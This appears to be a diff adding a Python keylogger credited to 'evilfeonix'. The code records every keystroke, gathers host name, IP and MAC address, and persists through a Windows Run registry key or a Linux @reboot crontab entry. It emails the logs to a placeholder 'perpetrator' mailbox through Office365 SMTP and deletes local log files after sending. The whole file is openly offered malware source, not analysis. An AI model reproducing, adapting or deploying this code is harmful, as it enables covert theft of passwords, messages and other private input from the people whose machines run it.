@@ -1,0 +1,224 @@
+# Versoin: 1.2
+# Name: Keylogger
+# Author: evilfeonix
+# Date: 01 - JANUARY - 2025
+# Website: www.evilfeonix.com 
+# Email: evilfeonix@gmail.com 
+
+
+#######    
+#######    C:\Users\[USERPROFILE]\AppData\Roaming\SystemSetup\SystemKeys
+#######    home/[USERPROFILE]/.config/KaliStartup/KaliKeys
+#######    
+
+try:import requests, keyboard
+except Exception as e:pass
+
+from sys import executable
+from threading import Timer
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import os, sys, time, glob, shutil, socket, smtplib, platform, subprocess
+
+
+
+BOT_ID_NUMBER = <bot_uid>
+USER_DEFINE_TIME = <send-report-every-second>
+EMAIL_ADDRESS = <perpetrator-email@provider.tld>
+EMAIL_PASSWORD = <perpetrator-email-password-here>
+DEFAULT_TIME = 60 # In seconds, 60 means 1 minute
+
+SEND_REPORT_EVERY = USER_DEFINE_TIME if USER_DEFINE_TIME else DEFAULT_TIME
+
+ignore="alt;delete;esc;left windows;right shift;"
+ignore+="page up;page down;pause;scroll lock;"
+ignore+="insert;print screen;home;end;shift;"
+ignore+="caps lock;menu;"
+ignore=ignore.split(";")
+
+
+def maintainAccess():
+    OS=platform.system()
+    if OS=="Windows":
+        L0C4T10N=os.environ['appdata'] + "\\SystemStartup\\Keygen.exe"
+        if not os.path.exists(L0C4T10N):
+            shutil.copyfile(executable, L0C4T10N)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v KeyGen /t REG_SZ /d "{L0C4T10N}" ', shell=True)
+    elif OS=="Linux":
+        L0C4T10N=os.path.expanduser('~') + "/.config/KaliStartup/Keygen"
+        if not os.path.exists(L0C4T10N):
+            os.makedirs(L0C4T10N)
+            filename=os.path.join(L0C4T10N, ".key")
+            shutil.copyfile(sys.executable, filename)
+            crontab_line=f"@reboot {filename}"
+            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')
+maintainAccess()
+
+
+class Keylogger:
+    def __init__(self, botid, interval):
+        self.start_dt=datetime.now()
+        self.end_dt=datetime.now()
+        self.interval=interval
+        self.botid=botid
+        self.l0g=""
+
+    def K3YL0G(self, event):
+        key=event.name
+        if len(key) > 1:
+            if key=="space":
+                key=" "
+            elif key=="enter":
+                key=f"\n"
+            elif key=="tab":
+                key="    "
+            elif key in ignore:
+                key=""
+            elif key=="backspace":
+                key=""
+                self.l0g=self.l0g[:(len(self.l0g)-1)] 
+            elif key=="decimal":
+                key="."
+            else:
+                key=key.replace(" ", "_")
+                key=f"[{key.upper()}]"
+        self.l0g+=key
+        print(self.l0g)
+
+    def internet(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect_ex(("www.google.com",80))
+            return True
+        except Exception:return False
+
+    def machine_information(self):
+        os=platform.platform()
+        host=socket.gethostname()
+        arch=platform.architecture()[0]
+        Ipad=socket.gethostbyname(host)
+        mac=socket.gethostbyaddr(host)[2]
+
+        #-- PLAIN TEXT VERSION --#
+        ver_=f"OS: {os} ({arch})\n"         #------>    Device Information
+        ver_+=f"Host Name: {host}\n"        #---\
+        ver_+=f"IP Address: {Ipad}\n"       #------>    Network Information
+        ver_+=f"MAC Address: {mac}\n"       #---/
+
+        #-- HTML FORMAT VERSION --#
+        ver__=f"OS: {os} ({arch})<br>"
+        ver__+=f"Host Name: {host}<br>"
+        ver__+=f"IP Address: {Ipad}<br>"
+        ver__+=f"MAC Address: {mac}<br>"
+
+        return ver_, ver__
+
+    def update_filename(self):
+        start_dt_str=str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str=str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename=f"key-{start_dt_str}_{end_dt_str}"
+
+    def grab_report_file(self):
+        OS=platform.system()
+        if OS=="Windows":
+            Del_cmd='del /f'
+            l0g_D1R=os.path.join(os.environ['appdata'], 'SystemStartup', 'Keygen', '*.txt')
+        elif OS=="Linux":
+            Del_cmd='rm -f'
+            l0g_D1R=os.path.join(os.path.expanduser("~"), '.config', 'KaliStartup', 'Keygen', '*.txt')
+
+        if not len(glob.glob(f"{l0g_D1R}")) > 1:        # if no file in target directory
+            return ""                                   # return empty string
+
+        grab_context=""
+        logfiles= glob.glob(f"{l0g_D1R}") + glob.glob(f"{l0g_D1R}w")
+
+        for File in logfiles:
+            with open(File, 'r') as logfile:
+                lines=logfile.readlines()
+                for line in lines:
+                    grab_context+=line
+            os.system(f'{Del_cmd} "{File}"')
+
+        return grab_context
+
+    def report_to_file(self):
+        OS=platform.system()
+        if OS=="Windows":
+            l0g_D1R=os.path.join(os.environ['appdata'], 'SystemStartup', 'Keygen')
+        elif OS=="Linux":
+            l0g_D1R=os.path.join(os.path.expanduser("~"), '.config', 'KaliStartup', 'Keygen')
+            self.filename = f"{self.filename}"
+
+        if not os.path.exists(l0g_D1R):
+            os.makedirs(l0g_D1R)
+
+        l0g_F1L3=os.path.join(l0g_D1R, f"{self.filename}.txt")
+        with open(l0g_F1L3, "w") as f:
+            print(f"\n===========================================================", file=f)
+            print(f"START TIME: {str(self.start_dt)[:-7]}", file=f)
+            print(f"===========================================================\n", file=f)
+            print(self.l0g, file=f)
+            print(f"\n===========================================================", file=f)
+            print(f"END TIME: {str(self.end_dt)[:-7]}", file=f)
+            print(f"===========================================================\n", file=f)
+
+        print(f"[+] Saved {l0g_F1L3}")
+
+    def msgs(self, message):
+        infoga=self.machine_information()
+        infoV_=f"{infoga[0]} {message}"
+        infoV__=f"{infoga[1]} {message}"
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS # f"Keylogger@gmail.com <{Keylogger}>"
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger"
+        html = f"<center><h1>Keylogger - {self.botid}</h1></center>"
+        html += f"<center><h3>Check This Out, New Update!</h3></center>"
+        html += f"<p>{infoV__}</p>"
+        text_part = MIMEText(infoV_, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        return str(msg)
+
+    def sendmail(self, email, password, message, verbose=1):
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        report=grab_report_file()
+        report+=message
+        server.sendmail(email, email, self.msgs(report))
+        server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
+
+    def report(self):
+        if self.l0g:
+            self.end_dt=datetime.now()
+            self.update_filename()
+            net=self.internet()
+            if net==True:
+                try:self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.l0g)
+                except Exception as a:
+                    print(a)
+                    self.report_to_file()
+            else:self.report_to_file()
+            self.start_dt=datetime.now()
+        self.l0g=""
+        timer=Timer(interval=self.interval, function=self.report)
+        timer.daemon=True
+        timer.start()
+
+    def start(self):
+        self.start_dt=datetime.now()
+        keyboard.on_release(callback=self.K3YL0G)
+        self.report()
+        print(f"{datetime.now()} - Started keylogger")
+        keyboard.wait()
+
+
+if __name__=="__main__":
+    b07=Keylogger(botid=BOT_ID_NUMBER, interval=SEND_REPORT_EVERY)
+    b07.start() 
